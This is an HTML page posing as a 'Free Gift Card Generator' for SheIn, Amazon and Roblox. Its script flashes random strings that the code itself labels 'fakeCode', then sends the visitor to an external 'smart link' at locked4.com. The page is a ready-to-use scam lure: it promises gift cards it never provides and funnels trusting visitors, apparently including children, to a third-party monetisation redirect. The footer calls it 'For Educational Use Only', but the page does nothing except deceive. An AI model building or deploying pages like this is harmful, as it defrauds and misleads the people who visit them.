<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Free Gift Card Generator</title>
  <style>
    body {
      background: linear-gradient(to right, #ffdee9, #b5fffc);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      color: #333;
    }

    .container {
      max-width: 400px;
      margin: auto;
      padding: 30px 20px;
      text-align: center;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      color: #555;
    }

    .cards {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin: 20px 0;
      flex-wrap: wrap;
    }

    .card {
      background-color: #fff;
      padding: 12px 16px;
      border-radius: 10px;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
      cursor: pointer;
      font-weight: bold;
      width: 100px;
    }

    .generate-btn {
      background-color: #e91e63;
      color: white;
      padding: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }

    .generate-btn:hover {
      background-color: #c2185b;
    }

    .code-box {
      display: none;
      font-family: monospace;
      font-size: 20px;
      margin-top: 20px;
      color: green;
    }

    .footer {
      margin-top: 40px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>üéÅ Free Gift Card Generator</h1>
    <p>Select your favorite gift card below and generate a free code:</p>

    <div class="cards">
      <div class="card">SheIn</div>
      <div class="card">Amazon</div>
      <div class="card">Roblox</div>
    </div>

    <button class="generate-btn" onclick="startGeneration()">Generate Code</button>

    <div class="code-box" id="codeBox">
      Generating code: <span id="fakeCode">XXXX-XXXX-XXXX</span>
    </div>
  </div>

  <div class="footer">
    ¬© 2025 | For Educational Use Only. Not affiliated with SheIn, Amazon, or Roblox.
  </div>

  <script>
    function generateFakeCode() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let code = '';
      for (let i = 0; i < 16; i++) {
        if (i === 4 || i === 9 || i === 14) {
          code += '-';
        } else {
          code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
      }
      return code;
    }

    function startGeneration() {
      document.querySelector(".generate-btn").style.display = "none";
      document.getElementById("codeBox").style.display = "block";

      let counter = 0;
      const interval = setInterval(() => {
        document.getElementById("fakeCode").innerText = generateFakeCode();
        counter++;
        if (counter > 5) {
          clearInterval(interval);
          // Redirect to smart link
          window.location.href = "https://locked4.com/sl/0pm9y";
        }
      }, 600);
    }
  </script>

</body>
</html>
